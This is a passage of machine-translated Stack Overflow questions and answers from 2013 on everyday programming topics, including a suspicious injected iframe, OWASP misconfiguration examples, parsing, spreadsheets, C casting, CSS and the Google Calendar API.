当 iframe 被注入 DOM 时，浏览器会向`http://xxx.tld/etc`. 这样做很可能是为了跟踪您网站上的点击量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T03:29:00.733

它打开一个 iframe 并运行一个 php 脚本。

其中可能包含谁知道什么。

此外，它似乎需要存在一个 id 为 qk 的 div。也许注入其他不良代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2022-02-19T10:50:12.867

它可能是在您的浏览器或 js 代码中注入恶意 iframe 或 cookie（甚至可能是 supercookie）。我认为它还可以通过将屏幕高度、宽度和长度设置为 1 像素来禁用使用 X 关闭选项卡。

# php - OWASP 2010 - 安全配置错误示例

> ID：15825410
> 
> 赞同：0
> 
> 时间：2013-04-05T03:27:03.050
> 
> 标签：php, security, owasp

我正在使用 PHP 和 OWASP 2010 TOP 10，需要您的帮助 :)

我需要一个如何使用[Security Misconfiguration](https://www.owasp.org/index.php/Top_10_2010-A6)的示例，我想我需要知道如何解决错误，然后才能知道如何预防。我试图通过谷歌找到一些，但大多只知道它的概念。我需要一个实际的例子，这样我才能更清楚地理解这一点:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T18:19:00.330

所以有一个非常好的[A6 示例 -](https://www.owasp.org/index.php/Top_10_2010-A6) PHP 中的安全错误配置。好吧，在 5.4.0 之前还有一个。它被称为[register_globals](http://php.net/manual/en/security.globals.php)。如果您启用了 register_globals，它会为漏洞打开几扇潜在的大门。

另一个很好的错误配置是如果你[`display_errors`](http://www.php.net/manual/en/errorfunc.configuration.php#ini.display-errors)在生产中。这是一个问题，因为任何错误都会向用户披露（可能为他们提供有关您的文件系统结构和应用程序的潜在易受攻击的错误产生部分的线索。

# java - 乔姆斯基形式的 CFG 算法的 Java 实现

> ID：15825411
> 
> 赞同：0
> 
> 时间：2013-04-05T03:27:13.527
> 
> 标签：java, context-free-grammar, chomsky-normal-form

目标是将伪代码转换为实际的工作代码。我以为我已经大致弄清楚了，但有些地方不太对劲。

我使用的规则是

```
S -> RT|empty
T -> TR|a
R => TR|b 
```

这是伪代码：

```
D == "On input W == WI . ..Wn :
1\. If W == e and S -> e is a rule, accept. [handle w == empty case]
2\. For i == 1 to n: [examine each substring of length 1] 
3\.     For each variable A:
4\.         Test whether A -> b is a rule, where b == Wi. 
5\.         If so,place A in table(i,i). 
6\. For l == 2 to n:
7\.     For i == 1 to n -l + 1:
8\.         Let j == i + l - 1,
9\.         For k == i to j -1:
10\.            For each rule A \037 BC:
11\.            If table(i,k)contains B and table(k + 1,j)contains
               C,put A in table(i,j).
12.If S is in table(l,n), accept.Otherwise, reject. 
```

这是实际的代码：

```
public class algorithm {

public static void main(String[] args){
    String w = " abab";
    String table[][] = new String[w.length()][w.length()];
    if (w.isEmpty()){
        System.out.println("Accept\n");
    }

    for(int i=1; i<w.length();i++){
        if(w.charAt(i)=='a')
            table[i][i]="R";
        else if(w.charAt(i)=='b')
            table[i][i]="T";
    }
    for(int l=2; l<=w.length();l++){
        for(int i=1; i<w.length()-l+1;i++){
            int j = i+l-1;
            for(int k=i; k<=j-1;k++){
                if(table[i][k].contains("T") && table[k+1][j].contains("R"))
                    table[i][j]="T,R"; //Not sure how to do this part?
                else if(table[i][k].contains("R") && table[k+1][j].contains("T"))
                    table[i][j]="S";

            }
        }

    }
    System.out.println("Finished");
    System.out.println(w);
    for(int i=1;i<w.length();i++){
        for(int j=1;j<w.length();j++){
        System.out.print(table[i][j]+"\t");}
        System.out.println("");

    }
    //System.out.println((table[1][w.length()-1]));
    //if (table[1][w.length()-1].equals("S"))
    //  System.out.println("Accept");
}

} 
```

我得到：

```
 abab
   R    S   S   null    
   null T   T,R S   
   null null    R   S   
   null null    null    T 
```

但是，正如您所知，baba 可以从该语法派生而来。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T05:00:19.087

弄清楚我做错了什么。首先我有`<=`而不是`<` 其次我没有完全初始化我的数组，所以我会在某些时候得到空引用。

# sql-server - SSRS - 动态项目列表 - 防止隐藏项目占用空间

> ID：15825417
> 
> 赞同：2
> 
> 时间：2013-04-05T03:27:50.200
> 
> 标签：sql-server, reporting-services, ssrs-2008

我有一个 SQL 2008 R2 SSRS 报告 - 很多时候效果很好，但根据特定客户的规则，它可能看起来并不漂亮。

它有一个列表 - 规则可能会指定列表中的项目应该显示或不显示。有一个查询，它返回一行，如果可能的话，出于性能原因，我想把它留在一个查询中。

例如，我们有一个列表，其中包含：

```
-- Section A
   \- Item 1      |     Item 2

-- Section B
   \- Item 1   |  Item 1a
      Item 2   |  Item 3

-- Section C
   \- Item 1 | Item 2 | Item 3 | Item 4
      Item 5 | Item 6 | Item 7 | Item 8 
```

但是，根据规则，我需要隐藏和“折叠”B 部分，以便 C 部分在 A 部分的正下方卷起。或者 A 部分可能会被折叠。

我知道，如果我有能力将其设为矩阵，我可以动态隐藏行，但如果不对查询进行大量重新配置，我就无法将其设为矩阵。

有什么想法可以完成隐藏部分或隐藏列表，并使下一个列表或部分出现在上一个可见部分或列表的正下方？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:15:42.540

您可以将 B 部分放在列表中的矩形内并有条件地隐藏该矩形。只需确保 A 部分和 C 部分与将有条件隐藏的矩形的顶部和底部齐平。或者，如果 B 部分只是列表的另一个迭代，那么您可以添加一个过滤器，使其不显示该迭代。

# regex - 带有正则表达式的简单面包屑

> ID：15825418
> 
> 赞同：1
> 
> 时间：2013-04-05T03:27:57.000
> 
> 标签：regex, breadcrumbs

我正在尝试通过拆分给定的 URL 来使用正则表达式创建一个简单的面包屑：

输入是这种形式的 URL - [http://someurl.com:1000/sites/Site1/Pages/Programs/Programs1/Programs2/SomePage.aspx?a=b;c=d](http://someurl.com:1000/sites/Site1/Pages/Programs/Programs1/Programs2/SomePage.aspx?a=b;c=d)

预期的输出是 - 你在这里：sites>Site1>Pages>Programs>Programs1>Programs2>SomePage

这是我使用的代码：

```
<script type="text/javascript">

var url ="http://someurl:1000/sites/Site1/Pages/Programs/Programs1/Programs2/SomePage.aspx?a=b;c=d"

var newURL = url.replace(new RegExp( "^(?:([^:/?#]+):)?(?://((?:(([^:@]*):?([^:@]*))?@)?([^:/?#]*)(?::(\\d*))?))?((((?:[^?#/]*/)*)([^?#]*))(?:\\?([^#]*))?(?:#(.*))?)", "g"),

  function( $0, $1, $2, $3, $4, $5, $6, $7, $8, $9){

  var domain = $1+ "://" + $2;
  var href = domain;
  var urlStrippedDown = $9;

  //Split the folders/pages within the path     /sites/Site1/Pages/Programs/Programs1/Programs2/SomePage.aspx
  var pieces = urlStrippedDown.replace( new RegExp (\\w+.aspx)|(\\w+),

  //Form the bread crumb with anchor tags and text
  function ($0, $1, $2)
  {

    zero = $0;
    var test =  "<a href='" + href +     urlStrippedDown.substring(0,urlStrippedDown.indexOf($0)+$0.length) +"'>" +     zero.replace('.aspx','')  + "</a>";
    return test;
  }
  );

  return pieces;
  }
);

//document.write("You are here: " + newURL.replace(/\//g,''));
document.write("You are here: " + newURL);

</script> 
```

面临的问题：我面临的唯一问题是最终输出（newURL）在每个链接之间有一个正斜杠（“/”），我想用“>”替换，但这似乎是不可能的。我不确定这个“/”是如何插入的，尽管在“锚”标签形成时它没有将其显示为文本的一部分。

预期的输出是 - 你在这里：sites>Site1>Pages>Programs>Programs1>Programs2>SomePage

而我得到 - 你在这里：/sites/Site1/Pages/Programs/Programs1/Programs2/SomePage 我无法用“>”替换这个“/”

PS：注释的代码行 - 如果我在这里替换，它会替换所有“/”，甚至是锚标签内的那些。“/”应该在文本中替换，而不是在锚的href中

正则表达式有缺陷吗？有没有更好的方法来处理这个问题？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T05:26:35.390

试试这个模式，它会选择你所有的“\”符号作为你的要求，用你想要的替换它们

```
(\/)(?=[^\/:]*(\/|$))(?=[^\/]) 
```

(/)(?=[^/:]*(/|$)) 仅当 "/" 后跟除 "/" 和 : 下一个以 "/" 结尾的所有字符或行尾时匹配 "/"

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T10:37:25.787

您的第一个替换实际上没有任何其他目的，只是将字符串拆分为多个部分：域和路径，相反，您应该考虑`RegExp.exec`在字符串上使用并以这种方式获取部分（参见下面的代码段）。

您的`newURL`变量包含 html，您可以在正则表达式中利用和使用它。如果你替换 all `/<a`，`&gt; <a`你应该有一个这样的字符串：`> sites > Site1 > Pages > Programs > Programs1 > Programs2 > SomePage`. 然后你必须删除第一个`>`，因为我想你不想要那个。

您的正则表达式对于您第一次匹配所需的内容似乎过于复杂，而您的第二次替换可能会更好地使用 a`indexOf('/')`和 a 循环，因为您并没有真正利用正则表达式匹配。

您将在下面找到一个函数，该函数使用与初始解决方案类似的方法为任意有效 URI 创建所需的链接链。由于修改了您的代码，我得到了这个，所以不发布它似乎是一种浪费。

```
var url = "http://someurl:1000/sites/Site1/Pages/Programs/Programs1/Programs2/SomePage.aspx?a=b;c=d";

function makeBreadcrumb(url){
    // Split match and split url into domain and path.
    var urlSplitter = new RegExp("^(.*?://[^/]+?/)([^?#:@]*)", "");
    var matcher;
    if (matcher = urlSplitter.exec(url)) {
        var domain = matcher[1];
        // Match every "folder" or "file" in the URI and replace with "breadcrumb link".
        return matcher[2].replace(new RegExp("([^/]+)(?:\\.[^\\.]+$|/)","g"),
            function(match,dir,pos,string) {
                return (pos > 0 ? " > " : "") + "<a href=\"" + domain + string.substring(0,pos) + match + "\">" + dir + "</a>";
            }
        );
    }
    return "";
}

document.write("You are here: " + makeBreadcrumb(url)); 
```

# matlab - matlab中的轴缩放

> ID：15825424
> 
> 赞同：1
> 
> 时间：2013-04-05T03:28:24.873
> 
> 标签：matlab

我试图在 Matlab 中使用以下简单命令将我的绘图轴设置为“紧密”-

```
axis tight 
```

这也可以使用 -

```
axis([xmin xmax ymin ymax]) 
```

但是通过这样做，我发现我的一些数据点落在所有轴的顶部，如您在此处看到的：[https ://docs.google.com/file/d/0B6GUNg-8d30vaUhVQVFOaTJKc1E/edit?usp=sharing](https://docs.google.com/file/d/0B6GUNg-8d30vaUhVQVFOaTJKc1E/edit?usp=sharing)

但是，当我在没有严格命令的情况下生成相同的图形时，它看起来更糟，因为您可能会在这里看到太多的空间：[https://docs.google.com/file/d/0B6GUNg-8d30vZ0JZR0JZYmhIeVU/edit? usp=分享](https://docs.google.com/file/d/0B6GUNg-8d30vZ0JZR0JZYmhIeVU/edit?usp=sharing)

我想知道 Matlab 中是否有任何函数可以帮助我在不让我的任何数据点落在任何轴上的情况下，将这个散点图表示为接近紧凑场景。比如说，四面都有 5% 的空间。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T03:50:28.723

您可以手动提供空间：

```
[xmin, xmax] = xlim;
[ymin, ymax] = ylim;

x_tol = (xmax-xmin)*0.05;    %(5%) tolerance
y_tol = (ymax-ymin)*0.05;    %(5%) tolerance

axis([xmin-x_tol xmax+x_tol ymin-y_tol ymax+y_tol]) 
```

# ios - EAAccessory 带车载蓝牙

> ID：15825425
> 
> 赞同：1
> 
> 时间：2013-04-05T03:28:27.737
> 
> 标签：ios, eaaccessory

我正在开发一个需要检测 iPhone 是否连接到汽车的应用程序。我会使用 EAAccessory。我的问题是 EAAccessory 会检测到这个吗？汽车蓝牙（我可以在其上连接我的 iPhone 并播放音乐）MFI 吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-17T20:17:34.750

如果您使用蓝牙 LE，则无需加入 MFI。我从来没有用过，所以我不知道它是如何工作的。

但是如果你使用蓝牙2.1，你需要先加入MFI。您可以在设置 --> 蓝牙中将您的设备连接到蓝牙模块。然后在你的应用程序中，

```
accessoryList = [[NSMutableArray alloc] initWithArray:[[EAAccessoryManager sharedAccessoryManager] connectedAccessories]]; 
```

这应该可以告诉你连接的附件。

# android - 如何保存我的活动状态

> ID：15825426
> 
> 赞同：-1
> 
> 时间：2013-04-05T03:28:29.827
> 
> 标签：android, android-activity, save, state

如何保存我的 Activity 的方式，以便在使用后退按钮关闭并恢复时将与关闭时的方式相同。

这是我的活动代码：

公共类级别扩展活动{

```
@Override
protected void onCreate(Bundle savedInstanceState) {
    // TODO Auto-generated method stub
    super.onCreate(savedInstanceState);
    setTheme(android.R.style.Theme_NoTitleBar_Fullscreen);
    setContentView(R.layout.levels);

    final EditText anstext1 = (EditText) findViewById(R.id.anstext1);
    Button button1 = (Button) findViewById(R.id.button1);

    button1.setOnClickListener(new View.OnClickListener() {

        @Override
        public void onClick(View v) {   
             String result = anstext1.getText().toString();
             if(result.equals("they"))
                 setContentView(R.layout.social);
             else 
               Toast.makeText(getApplicationContext(), "Wrong", Toast.LENGTH_LONG).show();
        }
    });
    } 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T03:30:53.490

在该`onSaveInstanceState()`方法中，您可以将数据添加到包中，然后在`onCreate()`调用时您可以从包中获取这些先前的值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T03:32:00.167

使用[onSaveInstanceState](http://developer.android.com/training/basics/activity-lifecycle/recreating.html)就像解释这里

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-04-05T03:30:49.263

可以使用`onResume`来恢复资源，当Activity死掉时，可以使用属性来保存资源和回滚。

# excel - Excel - 一个单元格中的多个 IF

> ID：15825429
> 
> 赞同：0
> 
> 时间：2013-04-05T03:28:42.440
> 
> 标签：excel, excel-formula

好吧，标题有点误导。首先，我在 Google 电子表格中。其次，这不仅仅是 IF(condition, return IF(...)) 那种情况（另外，我环顾四周，看看我是否可以在这个网站上发布一个 excel 公式问题......没有看到太多所以如果这不是合适的地方，请随意说，我会删除）。

我有一个表，我需要从 2 个单元格中获取一个值：

```
 -3 -2 -1 0  1  2  3  4  5
  ___________________________
A| 0, 0, 0, 1, 2, 4, 8, 12,16
B| 0, 0, 1, 2, 4, 8, 12,16,20
C| 0, 1, 2, 4, 8, 12,16,20,24
D| 1, 2, 4, 8, 12,16,20,24,28 
```

如果 A1 是 "A"、"B"、"C" 或 "D" 并且 B1 在 -3 - 5 的范围内，我基本上需要 C1 来等于返回的值。

我所有的尝试都是#error，所以在我努力解决这个问题的最后一个小时里，我没有任何东西可以展示。我相信有办法。如果你想要我失败的尝试，请告诉我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T04:04:40.620

尝试`INDEX`在数组模式下使用：

假设
数据`$G$9:$O$12`
在行标签中（`A`.. `D`）在`$F$9:$F$12`
列标签中`$G$8:$O$8`

```
=IFERROR(INDEX($G$9:$O$12,MATCH($A$1,$F$9:$F$12,0),MATCH($B$1,$G$8:$O$8,0)),0) 
```

这样做的好处是它不依赖于列标题是按升序排列的整数。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T03:59:36.380

假设您的表格存储在 的左上角`Sheet2`，那么您可以在单元格中使用以下公式`C1`：

```
=IFERROR(VLOOKUP($A$1,Sheet2!$A$1:$J$5,$B$1+5,FALSE),0) 
```

该[`VLOOKUP`](http://office.microsoft.com/en-us/excel-help/vlookup-HP005209335.aspx)函数查找您想要的字母所在的行（如 中给出的`A1`）。如果找到，它将返回由 的内容指示的列中的值`B1`加上 5 以转置为正确的值。该`FALSE`参数指示查找应该进行完全匹配。

如果未找到该值，则[`IFERROR`](http://office.microsoft.com/en-us/excel-help/iferror-function-HA010342587.aspx?CTT=1)环绕`VLOOKUP`将负责插入`0`.

我分享[了一个 Google 电子表格示例](https://docs.google.com/spreadsheet/ccc?key=0AsKgk0f08g0XdF9VN1RrZFhhMlkwSGpiSTV6aDY1THc&usp=sharing)，上面有公式`Sheet1`和表格`Sheet2`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T03:50:46.580

您可以使用`VLOOKUP`. 例如，如果您将表格放在 A5 处，请为 制作以下公式`C1`：

```
=VLOOKUP(A1,A5:J9,B1+5,FALSE) 
```

（`A5:J9`是您的查找表；您可以将其移动到任何地方，甚至在另一张纸上）

# c - 投射负数

> ID：15825430
> 
> 赞同：4
> 
> 时间：2013-04-05T03:28:55.970
> 
> 标签：c, casting

我正在尝试解释十六进制字节并将它们合并为有用的信息。

```
void processData(){
  signed char data;
  unsigned long a;//holds four bytes
  unsigned long b;
  unsigned int c;//holds two bytes
  unsigned char d;//holds one byte

  a=readA();//readA,readB,readC,readD return one unsigned byte;
  b=readB();
  c=readC();
  d=readD();

  data=(signed char) ((0xffffffff-((a<<24)|(b<<16)|(c<<8)|(d)))/1000);

} 
```

场景是接收到的整个包包含一个四字节的信息，例如0xAABBCCDD的值。readA() 将返回包中的最高字节，即 0xAA。readD() 将返回 0xDD。所以我需要在使用“|”之前改变它们 把它们放在一起：`(a<<24)|(b<<16)|(c<<8)|(d)`

所以我的问题是，对于这句话的右手边

`data=(signed char) ((0xffffffff-((a<<24)|(b<<16)|(c<<8)|(d)))/1000);`

为什么当我将结果转换为签名字符时它不返回字符？当我打印出来时，一切都错了。但是，如果我设置`data`为签名长，一切都是正确的。我想这是因为签名的字符不足以容纳所有信息并导致溢出。

如果我错了，请纠正我，其中的变量都`((a<<24)|(b<<16)|(c<<8)|(d)))`将被隐式转换为 unsigned long，这个表达式的结果也是如此。`((a<<24)|(b<<16)|(c<<8)|(d)))/1000`还将返回一个无符号长整数。然而，结果会明显更小，因为它除以 1000。

这四个字节的信息范围从 0xFFFF5037 到 0xFFFFFFFF，这也是这个表达式的结果的范围`((a<<24)|(b<<16)|(c<<8)|(d)))`。

因此，除法完成后，表达式的右侧应该在 0 到 45 之间。但是当我打印结果时，一切都在跳跃。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T06:23:38.647

**6.3.1.3 有符号和无符号整数**

> 1 当整数类型的值转换为_Bool以外的其他整数类型时，如果该值可以用新类型表示，则不变。2 否则，如果新类型是无符号的，则在新类型可以表示的最大值的基础上反复加减一，直到值在新类型的范围内。3 否则，新类型是有符号的，值不能在其中表示；结果是实现定义的，或者引发了实现定义的信号。

您提供给我们的代码可能会以不同的方式运行，具体取决于我们使用的实现所做的选择。看到实现引发与异常条件相对应的实现定义的信号（例如 SIGSEGV）并不是不合理的。如果实现决定默认操作是忽略该信号，那么您就处于该实现的未定义行为领域。

在较长的类型中进行计算，然后将较长的值转换为较小的值，方法是将其模减少到正确的宽度，并在必要时添加到 SCHAR_MIN 以产生负值。（*阅读评论*）

```
void processData(){
    signed char data;
    unsigned long a; // holds sizeof (unsigned long) bytes*
    unsigned long b;
    unsigned int c;  // holds sizeof (int) bytes*
    unsigned char d; // holds one byte
                     // Footnote: int and unsigned long might have padding bits
                     // --------- Attempting to modify those padding bits can 
                     //           result in undefined behavior...

    a = (readA() << 24) + (readB() << 16) + (readC() << 8) + d;
    a /= 1000;

    a %= UCHAR_MAX;
    if (a <= SCHAR_MAX) {
        // the value will fit safely into data as per point 1 of 6.3.1.3
        data = a;
    }
    else if (a >= (unsigned char) SCHAR_MIN) {
        // Since converting negative values to positive values will result 
        // in values greater than or equal to (unsigned char) SCHAR_MIN, 
        // by reducing a modulo
        // (unsigned char) SCHAR_MIN we work out how many to add to SCHAR_MIN.
        data = SCHAR_MIN + (a % (unsigned char) SCHAR_MIN);
    }
    else {
        // The value is out of range. Perhaps it corresponds to a negative zero?
        data = 0;
    }
} 
```

最后一个条件链可以缩短为：

```
data = a <= SCHAR_MAX                 ? a
     : a >= (unsigned char) SCHAR_MIN? SCHAR_MIN +(a % (unsigned char) SCHAR_MIN)
     : 0; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T06:28:00.963

其结果将是一个不适合有符号字符的负 32 位数字。您的代码没有任何意义，因此您得到的输出也没有任何意义。

在实践中，现实世界中的所有系统都是二进制补码系统，其行为如下：

`(signed char)0xAABBCCDD`将尝试将 DD 存储到带符号的 char 变量中，无论整个 32 位值是否已签名。原始符号位丢失。此外，二进制补码 0xDD 中的 MSB 将被视为符号位。因此，如果您尝试打印包含 0xDD 的签名字符，您将得到一个负数。

如果是`(signed char)0xAABBCC0D`这样，您将获得 0D 并且没有设置符号位，因为未设置 0D 的 MSB。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T04:00:14.010

Change the type of data to `long` and print it out with something like `printf("%lx", data)`. That will give you a better clue.

# module - 在 fortran 中，我应该在什么范围内放置“使用 [模块]”语句以获得最佳性能？

> ID：15825434
> 
> 赞同：1
> 
> 时间：2013-04-05T03:29:21.430
> 
> 标签：module, fortran

假设我在使用另一个模块的 Fortran 程序/模块中有一个子程序。如果我将“use”语句放在子程序或程序/模块范围内，这个子程序的性能会更好吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T03:47:27.773

如果“性能”是指执行速度，那么**不。**

声明的定位不会有任何区别。

# image-processing - Typ3 图像处理测试失败

> ID：15825439
> 
> 赞同：0
> 
> 时间：2013-04-05T03:29:45.620
> 
> 标签：image-processing, typo3

我想开始学习typo3，因此我在本地apache上安装了typo3来练习。但是，如果我使用安装工具中的测试菜单，我会在创建除`.GIF`and之外的所有文件格式时遇到错误`.BMP`。我尝试了Graphics Magick的其他一些配置，但原因是一样的。然后我读到，也许问题是禁用的`exec`功能。有人可以告诉我如何解决这个问题吗？

谢谢

**编辑：问题是缺少 GraphicsMagick 的库代表**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T07:44:13.060

ImageMagick 和 GraphicsMagick 需要该`exec()`函数。目前没有办法使用替代方式。所以你需要改变你的供应商。

# css - 修复了 Bootstrap 导航栏在 768 x 1024 视图下消失的问题

> ID：15825442
> 
> 赞同：3
> 
> 时间：2013-04-05T03:29:50.460
> 
> 标签：css, html, twitter-bootstrap, responsive-design

我下载了 bootstrap AZY responsive 1 page 模板，并且无法让固定导航栏保持在屏幕顶部以获取 768 x 1024 (iPad - Portrait) 分辨率。对于从 240 x 320 到 1024 x 768 的所有其他分辨率，它仍然固定在顶部。

我创建了一个小提琴：http: [//jsfiddle.net/B2sw6/](http://jsfiddle.net/B2sw6/)

我尝试使用它，但它没有用：

```
.navbar-fixed-top {
    position: fixed;
    right: 0;
    left: 0;
    z-index: 1030;
    top: 0;
} 
```

如果您将中心分隔条拖动到大约。768px 宽度，您将看到黑色导航栏与页面的其余部分一起向上滚动，而不是留在顶部。

有没有人有任何关于如何更新 CSS 来纠正这个问题的提示？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T17:11:28.773

你只需要做一个小的修复。添加`position:fixed;`到媒体查询中的 .navbar-fixed-top 最多 979px。

改变

```
@media (max-width: 979px){
  .navbar-fixed-top {
  margin-bottom: 0px;
  }
} 
```

和

```
@media screen and (max-width: 979px){
  .navbar-fixed-top {
    margin-bottom: 0px;
    position: fixed;
  }
} 
```

祝你好运。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T07:26:34.077

css中有一个媒体查询：

```
@media (max-width: 979px)
.navbar-fixed-top, .navbar-fixed-bottom {
position: static;
} 
```

将其更改为

```
position: fixed 
```

它应该工作！

# tinymce - 为新文本区域加载 Tinymce 无法调整大小

> ID：15825443
> 
> 赞同：1
> 
> 时间：2013-04-05T03:30:00.210
> 
> 标签：tinymce

我有一个表单有 1 个文本区域（tinymce onload）和一个添加新文本区域的按钮（相同的 id，类）

我为此启动了tinymce，第一个textarea无法调整大小？但如果我已经使用 tinymce 加载了 2 个 textarea，它们都可以调整大小！

出了什么问题，以及如何将 tinymce 加载到动态文本区域？

```
function StartTiny()
{
tinyMCE.init({
});
}
StartTiny();

function AddnewTextarea()
{
action to add new textarea here 
StartTiny();
} 
```

# xcode - Xcode 错误 100021

> ID：15825444
> 
> 赞同：0
> 
> 时间：2013-04-05T03:30:06.973
> 
> 标签：xcode, osx-mountain-lion

今天，我添加了一小部分功能（仅几行代码，其他一切都相同）到我想在 Mac App Store 上发布的应用程序中。

这是一个已经在商店中的应用程序，我所做的唯一更改是代码本身，所以发布应该和以前一样工作，但这是我们正在谈论的 Xcode，它出现了这个错误：

![在此处输入图像描述](https://i.stack.imgur.com/AMZc4.png)

没有别的了。当我转到存档管理器并尝试通过分发...对话框时会发生这种情况。关于如何调试这个和/或 Xcode 搞砸了什么的任何想法？这是最新的 OS X (10.8.3) 上的最新 Xcode (4.6.1)。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-05T23:59:02.633

这里的线索多于答案，但我遇到了同样的问题，结果证明是因为从“复制文件”构建步骤复制到应用程序中的符号链接。

但是，在我的情况下，我只是尝试捆绑在 Nvidia Cg 库中，并添加了一个“复制文件”条目来复制框架。因此罪魁祸首很明显：Cg.framework 目录有一堆符号链接。我不知道这是否是一个好的和适当的解决方案，但我只是将“复制文件”更改为仅复制代码库本身。

```
Copy Files
Destination: Frameworks
Subpath: Cg.framework
Cg in sdk/cg/Cg.framework/Versions/1.0 
```

希望这对最终在这里搜索错误代码 100021 的人有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-20T16:45:11.453

我有这个问题。我通过删除您通过单击项目名称看到的 Build Phases 下的 Copy Bundle Resources 列表中的 *.framework 项目来修复它。这些框架已经添加到您通常在最左侧看到的项目文件列表中。

# node.js - 使用 API 创建 Google 日历活动不会创建环聊链接

> ID：15825447
> 
> 赞同：10
> 
> 时间：2013-04-05T03:30:25.253
> 
> 标签：node.js, google-api, google-calendar-api, google-oauth, hangout

到目前为止，我已经成功地将`googleapis`和`gapitoken`包组合在一起，通过 API 在 Google 日历上创建事件。这一切的重点是找到一种以编程方式生成 Google Hangout 链接的方法，据我所知，这是您无法通过 API 完成的。根据[这篇文章](http://www.riskcompletefailure.com/2012/11/programmatically-scheduling-hangouts.html)，您应该能够在创建活动时启用自动创建环聊链接，我已经为该帐户完成了这项工作。

我使用的代码只会从 Node.js 运行，因此没有面向用户的部分。我正在使用服务帐户技术通过 OAuth2.0 进行身份验证。一切似乎都工作正常，除了创建的事件不包含名为“hangoutLink”的属性。有任何想法吗？

```
var moment = require('moment');
var googleapis = require('googleapis');
var GoogleToken = require('gapitoken');
var OAuth2Client = googleapis.OAuth2Client;

var token = new GoogleToken({
    iss: '*******************@developer.gserviceaccount.com',
    scope: 'https://www.googleapis.com/auth/calendar',
    keyFile: './*****************.pem'
}, function (err) {
    if (err) {
        return console.log(err);
    }

    token.getToken(function (err, token) {
        if (err) {
            return console.log(err);
        }

        googleapis.load('calendar', 'v3', function (err, client) {
            var oauthClient = new OAuth2Client('', '', '', {}, {
                token_type: 'Bearer',
                access_token: token
            });

            var now = moment().format();

            client
                .calendar
                .events
                .insert({
                    calendarId: 'primary',
                    resource: {
                        summary: 'hangout',
                        description: 'hangout',
                        reminders: {
                            overrides: {
                                method: 'popup',
                                minutes: 0
                            }
                        },
                        start: {
                            dateTime: now
                        },
                        end: {
                            dateTime: now
                        },
                        attendees: [{
                            email: '****@**********.com'
                        }]
                    }
                })
                .withAuthClient(oauthClient)
                .execute(function (err, event) {
                    // event does not contain hangoutLink
                    console.log(event.hangoutLink);
                });
        });
    });
}); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2018-07-11T20:01:15.207

一切似乎都很好，除了您必须分两部分添加环聊数据。首先，如果您要创建，并且还作为表示参数版本的参数，它被称为`conferenceDataVersion`

```
 const event = {
        "summary": "Google I/O 2015",
        "location": "800 Howard St., San Francisco, CA 94103",
        "description": "A chance to hear more about Google\"s developer products.",
        "start": {
            "dateTime": "2015-05-28T09:00:00-07:00",
            "timeZone": "America/Los_Angeles",
        },
        "end": {
            "dateTime": "2015-05-28T17:00:00-07:00",
            "timeZone": "America/Los_Angeles",
        },
        "conferenceData": {
            "createRequest": {
                "requestId": "someRandomKey"
            }
        }
    };

    calendar.events.insert({
        auth: yourAuth,
        calendarId: 'primary',
        resource: event,
        conferenceDataVersion: 1
    }, function (error, event) {
        if (error) {
            console.log("CALENDAR_ERROR", error);
        }
        console.log("CALENDAR_SUCCESS", event.data);
        console.log("HANGOUT_LINK", event.data.hangoutLink);
    }); 
```

`const event`大部分是从文档上的示例复制而来的。这里的关键是在两个部分中添加会议相关数据。仅添加：

```
 "conferenceData": {
        "createRequest": {
            "requestId": "someRandomKey"
        }
    } 
```

不起作用，您还必须对`conferenceDataVersion: int`论点。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-05-28T17:07:55.360

这不是一个完整的解决方案，但我通过稍微改变约束取得了部分成功。自动创建带有事件的环聊链接似乎是特定于帐户的设置，而不是特定于日历的设置。这意味着使用服务帐户模型创建事件不会触发环聊创建，因为我们（据我所知）没有办法在创建的谷歌帐户上打开自动创建环聊服务帐户模型。

为了测试这个理论，我组合了一个基于 OAuth 的版本，它可以获取传统的 google 帐户令牌。它看起来像这样：[https ://gist.github.com/drewww/5665130](https://gist.github.com/drewww/5665130)

它或多或少与您的示例相同，除了使用的令牌类型。在回调中，hangoutLink 被可靠地填充。

显然，这不像您的示例那样干净。它依赖于传统的 oauth 流程，创建事件的用户*必须*在其个人帐户设置中启用自动创建视频群聊。从用户体验的角度来看，这显然非常不方便。我将尝试创建一个虚拟谷歌帐户并让它拥有我所有的环聊。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-05T17:25:23.740

将凭据显式设置为身份验证客户端：

```
var oauthClient = new OAuth2Client('', '', '');
oauthClient.credentials = {
  token_type: 'Bearer',
  access_token: token
}; 
```

# javascript - 替换方法不起作用

> ID：15825452
> 
> 赞同：2
> 
> 时间：2013-04-05T03:30:40.743
> 
> 标签：javascript, string

